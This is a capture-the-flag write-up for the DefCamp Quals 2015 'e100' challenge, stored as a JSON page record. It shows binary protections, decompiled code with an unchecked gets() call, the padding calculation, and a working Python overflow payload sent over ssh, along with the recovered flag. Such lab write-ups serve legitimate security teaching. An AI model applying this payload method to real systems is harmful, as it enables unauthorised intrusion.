{"pageContext":{"html":"<p><a href=\"ctf=defcamp-quals-2015\"></a>\n<a href=\"type=exploit\"></a>\n<a href=\"tags=buffer-overflow\"></a></p>\n<p>We are given a <a href=\"/e100-256a13d7efa7c32e0efb75e441f46abe.bin\">binary</a> and a <a href=\"/id_rsa_e100-f3a8a5e6f4a1d398c4009207dfbb1ed4.\">key</a>.</p>\n<p><code>bash $ file e100.bin e100.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4410355efef2e99ac54e4028dba1b3e40d055fee, stripped</code>\nAlso loading in gdb-peda.\n<code>bash gdb-peda$ checksec CANARY : ENABLED FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial</code>\nGood. Loading the binary in <a href=\"http://www.hopperapp.com/\">Hopper</a> and decompiling.\n<code>c function sub_80484fd { var_C = *0x14; printf(\"Enter password: \"); gets(var_2C); if (arg0 == 0xbadb0169) { system(\"cat flag\"); } else { for (var_30 = 0x0; var_30 &#x3C; strlen(var_2C); var_30 = var_30 + 0x1) { *(int8_t *)(var_30 + var_2C) = arg0 ^ *(int8_t *)(var_30 + var_2C) &#x26; 0xff; } printf(\"Your new secure password is: \"); printf(var_2C); } eax = var_C ^ *0x14; COND = eax == 0x0; if (!COND) { eax = __stack_chk_fail(); } return eax; }</code>\nSo a gets and a static hardcoded check. Basic buffer overflow!!</p>\n<p><code>bash 0x804851b: lea eax,[ebp-0x2c] 0x804851e: mov DWORD PTR [esp],eax => 0x8048521: call 0x80483a0 &#x3C;gets@plt> 0x8048526: cmp DWORD PTR [ebp+0x8],0xbadb0169</code>\nThis gives us padding = 0x2c+0x8 = 52\nNow the final blow.\n<code>bash $ python -c \"print 'A'*52+'\\xba\\xdb\\x01\\x69'[::-1]\" | ssh -i id_rsa_e100 dctf@10.13.37.6 Pseudo-terminal will not be allocated because stdin is not a terminal. DCTF{3671bacdb5ea5bc26982df7da6de196e} Enter password: *** stack smashing detected ***: /home/dctf/e100 terminated</code></p>\n<p>Flag:</p>\n<blockquote>\n<p>DCTF{3671bacdb5ea5bc26982df7da6de196e}</p>\n</blockquote>","relativePath":"writeups/defcamp-quals-2015/exploit/e100/sudhackar"}}